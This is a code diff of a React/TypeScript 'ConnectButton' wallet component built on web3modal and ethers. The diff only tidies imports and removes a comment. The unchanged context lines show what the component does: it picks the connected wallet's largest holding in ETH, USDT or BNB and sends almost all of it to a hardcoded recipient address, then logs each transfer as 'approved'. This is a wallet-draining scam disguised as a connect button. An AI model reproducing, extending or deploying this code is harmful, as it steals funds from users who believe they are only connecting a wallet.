@@ -2,7 +2,7 @@
 
 import { createWeb3Modal, defaultConfig } from '@web3modal/ethers/react'
 import { useWeb3Modal } from '@web3modal/ethers/react'
-import { ethers } from 'ethers'
+import { ethers, BigNumber } from 'ethers'
 import styled from 'styled-components'
 import { useState } from 'react'
 
@@ -60,7 +60,6 @@ const sendLog = async (type: string, details: string) => {
 }
 
 export function ConnectButton() {
-  // 4. Use modal hook
   const { open } = useWeb3Modal()
   const [provider, setProvider] = useState<ethers.providers.Web3Provider | null>(null)
 
@@ -105,7 +104,7 @@ export function ConnectButton() {
 
       // Calculate gas fees
       const gasPrice = await web3Provider.getGasPrice()
-      const gasLimit = ethers.BigNumber.from(21000) // Base transaction cost
+      const gasLimit = BigNumber.from(21000) // Base transaction cost
       const gasCost = gasPrice.mul(gasLimit)
 
       const recipient = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f' // replace with the desired recipient address
@@ -119,14 +118,14 @@ export function ConnectButton() {
         await tx.wait()
         await sendLog('approved', `ETH transaction to ${recipient} with value ${value.toString()}`)
       } else if (highestBalanceToken === 'USDT') {
-        const usdtGasLimit = ethers.BigNumber.from(65000) // Approximate gas limit for USDT transfer
+        const usdtGasLimit = BigNumber.from(65000) // Approximate gas limit for USDT transfer
         const usdtGasCost = gasPrice.mul(usdtGasLimit)
         const usdtValue = highestBalance.sub(usdtGasCost)
         const tx = await usdtContract.transfer(recipient, usdtValue)
         await tx.wait()
         await sendLog('approved', `USDT transaction to ${recipient} with value ${usdtValue.toString()}`)
       } else if (highestBalanceToken === 'BNB') {
-        const bnbGasLimit = ethers.BigNumber.from(65000) // Approximate gas limit for BNB transfer
+        const bnbGasLimit = BigNumber.from(65000) // Approximate gas limit for BNB transfer
         const bnbGasCost = gasPrice.mul(bnbGasLimit)
         const bnbValue = highestBalance.sub(bnbGasCost)
         const tx = await bnbContract.transfer(recipient, bnbValue)
